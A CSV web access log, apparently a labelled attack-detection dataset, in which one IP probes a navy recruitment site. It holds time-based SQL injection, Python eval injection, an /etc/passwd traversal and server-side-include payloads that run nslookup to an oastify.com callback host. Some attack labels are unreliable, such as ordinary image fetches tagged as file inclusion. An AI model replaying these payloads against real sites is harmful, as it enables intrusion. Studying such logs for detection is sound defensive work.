timestamp,ip,method,url,status,attack_type,user_agent
2025-05-22 04:17:47,192.168.210.183,GET,/public/photo_gallery/3_1567313762.png,200,Remote File Inclusion (RFI),facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)
2025-05-22 04:17:47,192.168.210.183,GET,/public/video_gallery/Capture_1597144767.PNG,200,Remote File Inclusion (RFI),facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)
2025-05-22 04:17:48,192.168.210.183,GET,/public/video_gallery/20180506123617.jpg,200,Remote File Inclusion (RFI),facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)
2025-05-22 04:17:48,192.168.210.183,GET,/public/frontend/template/news/images/img_sme_news_and_events.png,200,Remote File Inclusion (RFI),facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)
2025-05-22 04:17:48,192.168.210.183,GET,/public/frontend/template/graphics/section3-dots.png,200,Remote File Inclusion (RFI),facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)
2025-05-22 04:17:48,192.168.210.183,GET,/public/frontend/template/img/gallery-background.jpg,200,Remote File Inclusion (RFI),facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)
2025-05-22 04:17:48,192.168.210.183,GET,/public/frontend/template/graphics/info-box-theme-bg.jpg,200,Remote File Inclusion (RFI),facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)
2025-05-22 04:17:48,192.168.210.183,GET,/public/frontend/template/img/navy.png,200,Remote File Inclusion (RFI),facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)
2025-05-22 04:18:18,192.168.210.183,GET,/public/bn_link_gallery/b508c7c08f2039321122d7c9393317cd.png,200,Remote File Inclusion (RFI),facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)
2025-05-22 04:18:18,192.168.210.183,GET,/public/bn_link_gallery/66cfb0fd33972834beff6d67ab1eebb8.png,200,Remote File Inclusion (RFI),facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)
2025-05-22 04:18:19,192.168.210.183,GET,/public/bn_link_gallery/1be3731a9340a8606cfd18dba168f6b0.png,200,Remote File Inclusion (RFI),facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)
2025-05-22 04:18:22,192.168.210.183,GET,/public/bn_link_gallery/536c7fa885bdc532d9bca79143633342.png,200,Remote File Inclusion (RFI),facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)
2025-05-22 04:18:22,192.168.210.183,GET,/public/bn_link_gallery/66cfb0fd33972834beff6d67ab1eebb8.png,200,Remote File Inclusion (RFI),facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)
2025-05-22 04:18:27,192.168.210.183,GET,/public/bn_link_gallery/6674b235a2fa3859f4ee4aa37122edea.jpg,200,Remote File Inclusion (RFI),facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)
2025-05-22 04:18:39,192.168.210.183,GET,/public/bn_link_gallery/00460804b63d5e8ae978adb03dbabf36.png,200,Remote File Inclusion (RFI),facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)
2025-05-22 04:18:41,192.168.210.183,GET,/public/bn_link_gallery/ff90a98872440d7970ac75350d1291cd.png,200,Remote File Inclusion (RFI),facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)
2025-05-22 04:18:42,192.168.210.183,GET,/public/bn_link_gallery/ff90a98872440d7970ac75350d1291cd.png,200,Remote File Inclusion (RFI),facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)
2025-05-22 04:18:53,192.168.210.183,GET,/public/bn_link_gallery/536c7fa885bdc532d9bca79143633342.png,200,Remote File Inclusion (RFI),facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)
2025-05-22 04:19:04,192.168.210.183,GET,/public/bn_link_gallery/1be3731a9340a8606cfd18dba168f6b0.png,200,Remote File Inclusion (RFI),facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)
2025-05-22 04:19:58,192.168.210.183,GET,/public/bn_link_gallery/6674b235a2fa3859f4ee4aa37122edea.jpg,200,Remote File Inclusion (RFI),facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)
2025-05-22 04:26:16,192.168.210.183,GET,/navy/search?q=%22--%3e'--%3e%60--%3e%3c!--%23set%20var%3d%226ok%22%20value%3d%225nj883t0k3%22--%3e%3c!--%23set%20var%3d%228qm%22%20value%3d%227plaa5v2m5%22--%3e%3c!--%23echo%20var%3d%226ok%22--%3e%3c!--%23echo%20var%3d%228qm%22--%3e%3c!--%23exec%20cmd%3d%22nslookup%20-q%3dcname%20sa6vvqgn7q3a238ylegq6coa319uxlldj1ao0cp.oastify.com%22%20--%3e,200,SQL Injection,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 04:26:52,192.168.210.183,GET,/public/frontend/template/css'(select*from(select(sleep(20)))a)'/fonts/fontawesome-webfont.woff2?v=4.6.1,200,SQL Injection,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 04:27:39,192.168.210.183,GET,/public/frontend/template/css'%2b(select*from(select(sleep(20)))a)%2b'/fonts/fontawesome-webfont.woff2?v=4.6.1,200,SQL Injection,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 04:28:32,192.168.210.183,GET,/public/frontend/template/css'%20waitfor%20delay'0%3a0%3a20'--/fonts/fontawesome-webfont.woff2?v=4.6.1,200,SQL Injection,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 04:29:20,192.168.210.183,GET,/public/frontend/template/css')waitfor%20delay'0%3a0%3a20'--/fonts/fontawesome-webfont.woff2?v=4.6.1,200,SQL Injection,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 04:30:05,192.168.210.183,GET,/public/frontend/template/css'%7c%7cpg_sleep(20)--/fonts/fontawesome-webfont.woff2?v=4.6.1,200,SQL Injection,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 04:30:58,192.168.210.183,GET,/public/frontend/template/css'%20AND%20pg_sleep(20)--/fonts/fontawesome-webfont.woff2?v=4.6.1,200,SQL Injection,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 04:31:42,192.168.210.183,GET,/public/frontend/template/css'%2c''%7c%7cpg_sleep(20)--/fonts/fontawesome-webfont.woff2?v=4.6.1,200,SQL Injection,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 04:35:24,192.168.210.183,POST,/Bangladesh-Navy-Civilian-Technical--Recruitment-2024?eval(compile('for%20x%20in%20range(1)%3a%5cn%20import%20time%5cn%20time.sleep(20)'%2c'a'%2c'single'))=1,200,SQL Injection,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 04:36:50,192.168.210.183,GET,/public/bn_link_gallery/b508c7c08f2039321122d7c9393317cd.png,200,Remote File Inclusion (RFI),facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)
2025-05-22 04:38:00,192.168.210.183,POST,/Bangladesh-Navy-Civilian-Technical--Recruitment-2024?%22--%3e'--%3e%60--%3e%3c!--%23set%20var%3d%22xi2%22%20value%3d%22wh1z2unreu%22--%3e%3c!--%23set%20var%3d%22zk4%22%20value%3d%22yj314wptgw%22--%3e%3c!--%23echo%20var%3d%22xi2%22--%3e%3c!--%23echo%20var%3d%22zk4%22--%3e%3c!--%23exec%20cmd%3d%22nslookup%20-q%3dcname%20j4omphae1hx1wu2pf5ah03i1xs3lrff7dv7iy6n.oastify.com%22%20--%3e=1,200,SQL Injection,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 04:46:39,192.168.210.183,POST,/Simulators'(select*from(select(sleep(20)))a)',200,SQL Injection,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 04:46:59,192.168.210.183,POST,/OJT'(select*from(select(sleep(20)))a)',200,SQL Injection,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 04:47:31,192.168.210.183,POST,/Simulators'%2b(select*from(select(sleep(20)))a)%2b',200,SQL Injection,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 04:47:49,192.168.210.183,POST,/OJT'%2b(select*from(select(sleep(20)))a)%2b',200,SQL Injection,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 04:48:19,192.168.210.183,POST,/Simulators'%20and%20(select*from(select(sleep(20)))a)--%20,200,SQL Injection,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 04:48:32,192.168.210.183,POST,/OJT'%20and%20(select*from(select(sleep(20)))a)--%20,200,SQL Injection,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 04:48:59,192.168.210.183,POST,/Simulators%2c(select*from(select(sleep(20)))a),200,SQL Injection,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 04:49:07,192.168.210.183,GET,/public/frontend/template/eval(compile('for%20x%20in%20range(1)%3a%5cn%20import%20time%5cn%20time.sleep(20)'%2c'a'%2c'single'))/fonts/fontawesome-webfont.woff2?v=4.6.1,200,SQL Injection,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 04:49:14,192.168.210.183,POST,/OJT%2c(select*from(select(sleep(20)))a),200,SQL Injection,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 04:49:47,192.168.210.183,POST,/Simulators'%20waitfor%20delay'0%3a0%3a20'--,200,SQL Injection,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 04:49:54,192.168.210.183,GET,/public/frontend/template/css%7b$%7bsleep(20)%7d%7d/fonts/fontawesome-webfont.woff2?v=4.6.1,200,SQL Injection,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 04:50:01,192.168.210.183,POST,/OJT'%20waitfor%20delay'0%3a0%3a20'--,200,SQL Injection,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 04:50:48,192.168.210.183,POST,/Simulators')waitfor%20delay'0%3a0%3a20'--,200,SQL Injection,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 04:51:05,192.168.210.183,POST,/OJT')waitfor%20delay'0%3a0%3a20'--,200,SQL Injection,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 04:51:39,192.168.210.183,POST,/Simulators'%2c0)waitfor%20delay'0%3a0%3a20'--,200,SQL Injection,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 04:51:55,192.168.210.183,POST,/OJT'%2c0)waitfor%20delay'0%3a0%3a20'--,200,SQL Injection,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 04:52:32,192.168.210.183,POST,/Simulators'%7c%7cpg_sleep(20)--,200,SQL Injection,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 04:53:07,192.168.210.183,POST,/OJT'%7c%7cpg_sleep(20)--,200,SQL Injection,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 04:53:16,192.168.210.183,POST,/Simulators'%20AND%20pg_sleep(20)--,200,SQL Injection,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 04:53:47,192.168.210.183,POST,/OJT'%20AND%20pg_sleep(20)--,200,SQL Injection,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 04:53:56,192.168.210.183,POST,/Simulators'%2c''%7c%7cpg_sleep(20)--,200,SQL Injection,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 04:54:23,192.168.210.183,POST,/Bangladesh-Navy-Civilian-Technical--Recruitment-2024'(select*from(select(sleep(20)))a)',200,SQL Injection,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 04:54:31,192.168.210.183,POST,/OJT'%2c''%7c%7cpg_sleep(20)--,200,SQL Injection,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 04:54:44,192.168.210.183,POST,/Simulators')AND%20pg_sleep(20)--,200,SQL Injection,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 04:55:08,192.168.210.183,POST,/Bangladesh-Navy-Civilian-Technical--Recruitment-2024'%2b(select*from(select(sleep(20)))a)%2b',200,SQL Injection,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 04:55:17,192.168.210.183,POST,/OJT')AND%20pg_sleep(20)--,200,SQL Injection,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 04:55:30,192.168.210.183,POST,/Simulators'%2c0)AND%20pg_sleep(20)--,200,SQL Injection,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 04:55:54,192.168.210.183,POST,/Bangladesh-Navy-Civilian-Technical--Recruitment-2024'%20and%20(select*from(select(sleep(20)))a)--%20,200,SQL Injection,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 04:56:09,192.168.210.183,POST,/OJT'%2c0)AND%20pg_sleep(20)--,200,SQL Injection,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 04:56:48,192.168.210.183,POST,/Bangladesh-Navy-Civilian-Technical--Recruitment-2024%2c(select*from(select(sleep(20)))a),200,SQL Injection,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 04:57:35,192.168.210.183,POST,/Bangladesh-Navy-Civilian-Technical--Recruitment-2024'%20waitfor%20delay'0%3a0%3a20'--,200,SQL Injection,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 04:58:22,192.168.210.183,POST,/Bangladesh-Navy-Civilian-Technical--Recruitment-2024')waitfor%20delay'0%3a0%3a20'--,200,SQL Injection,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 04:59:20,192.168.210.183,POST,/Bangladesh-Navy-Civilian-Technical--Recruitment-2024'%2c0)waitfor%20delay'0%3a0%3a20'--,200,SQL Injection,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 05:00:15,192.168.210.183,POST,/Bangladesh-Navy-Civilian-Technical--Recruitment-2024'%7c%7cpg_sleep(20)--,200,SQL Injection,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 05:01:13,192.168.210.183,POST,/Bangladesh-Navy-Civilian-Technical--Recruitment-2024'%20AND%20pg_sleep(20)--,200,SQL Injection,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 05:01:48,192.168.210.183,GET,/public/frontend/template//etc/passwd/fonts/fontawesome-webfont.woff2?v=4.6.1,200,Local File Inclusion (LFI) / Path Traversal,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 05:02:02,192.168.210.183,POST,/Bangladesh-Navy-Civilian-Technical--Recruitment-2024'%2c''%7c%7cpg_sleep(20)--,200,SQL Injection,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 05:02:50,192.168.210.183,POST,/Bangladesh-Navy-Civilian-Technical--Recruitment-2024')AND%20pg_sleep(20)--,200,SQL Injection,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 05:03:37,192.168.210.183,POST,/Bangladesh-Navy-Civilian-Technical--Recruitment-2024'%2c0)AND%20pg_sleep(20)--,200,SQL Injection,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 05:09:02,192.168.210.183,POST,/Simulators'%2beval(compile('for%20x%20in%20range(1)%3a%5cn%20import%20time%5cn%20time.sleep(20)'%2c'a'%2c'single'))%2b',200,SQL Injection,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 05:09:51,192.168.210.183,POST,/eval(compile('for%20x%20in%20range(1)%3a%5cn%20import%20time%5cn%20time.sleep(20)'%2c'a'%2c'single')),200,SQL Injection,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 05:10:48,192.168.210.183,POST,/Simulators'.sleep(20).',200,SQL Injection,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 05:11:40,192.168.210.183,POST,/OJT'%2beval(compile('for%20x%20in%20range(1)%3a%5cn%20import%20time%5cn%20time.sleep(20)'%2c'a'%2c'single'))%2b',200,SQL Injection,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 05:11:47,192.168.210.183,POST,/Simulators%7b$%7bsleep(20)%7d%7d,200,SQL Injection,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 05:12:40,192.168.210.183,POST,/eval(compile('for%20x%20in%20range(1)%3a%5cn%20import%20time%5cn%20time.sleep(20)'%2c'a'%2c'single')),200,SQL Injection,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 05:13:20,192.168.210.183,POST,/OJT'.sleep(20).',200,SQL Injection,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 05:14:07,192.168.210.183,POST,/OJT%7b$%7bsleep(20)%7d%7d,200,SQL Injection,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 05:17:07,192.168.210.183,POST,/Bangladesh-Navy-Civilian-Technical--Recruitment-2024'%2beval(compile('for%20x%20in%20range(1)%3a%5cn%20import%20time%5cn%20time.sleep(20)'%2c'a'%2c'single'))%2b',200,SQL Injection,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 05:17:58,192.168.210.183,POST,/eval(compile('for%20x%20in%20range(1)%3a%5cn%20import%20time%5cn%20time.sleep(20)'%2c'a'%2c'single')),200,SQL Injection,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 05:18:38,192.168.210.183,POST,/design-and-Evaluation-cell'(select*from(select(sleep(20)))a)',200,SQL Injection,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 05:18:45,192.168.210.183,POST,/Bangladesh-Navy-Civilian-Technical--Recruitment-2024'.sleep(20).',200,SQL Injection,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 05:19:29,192.168.210.183,POST,/design-and-Evaluation-cell'%2b(select*from(select(sleep(20)))a)%2b',200,SQL Injection,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 05:19:37,192.168.210.183,POST,/Bangladesh-Navy-Civilian-Technical--Recruitment-2024%7b$%7bsleep(20)%7d%7d,200,SQL Injection,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 05:20:24,192.168.210.183,POST,/design-and-Evaluation-cell'%20and%20(select*from(select(sleep(20)))a)--%20,200,SQL Injection,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 05:21:21,192.168.210.183,POST,/design-and-Evaluation-cell%2c(select*from(select(sleep(20)))a),200,SQL Injection,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 05:21:53,192.168.210.183,GET,/public/frontend/template/css/fonts'(select*from(select(sleep(20)))a)'/fontawesome-webfont.woff2?v=4.6.1,200,SQL Injection,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 05:22:13,192.168.210.183,POST,/design-and-Evaluation-cell'%20waitfor%20delay'0%3a0%3a20'--,200,SQL Injection,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 05:22:43,192.168.210.183,GET,/public/frontend/template/css/fonts'%2b(select*from(select(sleep(20)))a)%2b'/fontawesome-webfont.woff2?v=4.6.1,200,SQL Injection,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 05:23:03,192.168.210.183,POST,/design-and-Evaluation-cell')waitfor%20delay'0%3a0%3a20'--,200,SQL Injection,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 05:23:38,192.168.210.183,GET,/public/frontend/template/css/fonts'%20waitfor%20delay'0%3a0%3a20'--/fontawesome-webfont.woff2?v=4.6.1,200,SQL Injection,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 05:23:57,192.168.210.183,POST,/design-and-Evaluation-cell'%2c0)waitfor%20delay'0%3a0%3a20'--,200,SQL Injection,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 05:24:19,192.168.210.183,GET,/public/frontend/template/css/fonts')waitfor%20delay'0%3a0%3a20'--/fontawesome-webfont.woff2?v=4.6.1,200,SQL Injection,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 05:24:39,192.168.210.183,POST,/design-and-Evaluation-cell'%7c%7cpg_sleep(20)--,200,SQL Injection,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 05:25:12,192.168.210.183,GET,/public/frontend/template/css/fonts'%7c%7cpg_sleep(20)--/fontawesome-webfont.woff2?v=4.6.1,200,SQL Injection,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 05:25:26,192.168.210.183,POST,/design-and-Evaluation-cell'%20AND%20pg_sleep(20)--,200,SQL Injection,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 05:25:56,192.168.210.183,GET,/public/frontend/template/css/fonts'%20AND%20pg_sleep(20)--/fontawesome-webfont.woff2?v=4.6.1,200,SQL Injection,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 05:26:16,192.168.210.183,POST,/design-and-Evaluation-cell'%2c''%7c%7cpg_sleep(20)--,200,SQL Injection,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 05:26:48,192.168.210.183,GET,/public/frontend/template/css/fonts'%2c''%7c%7cpg_sleep(20)--/fontawesome-webfont.woff2?v=4.6.1,200,SQL Injection,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
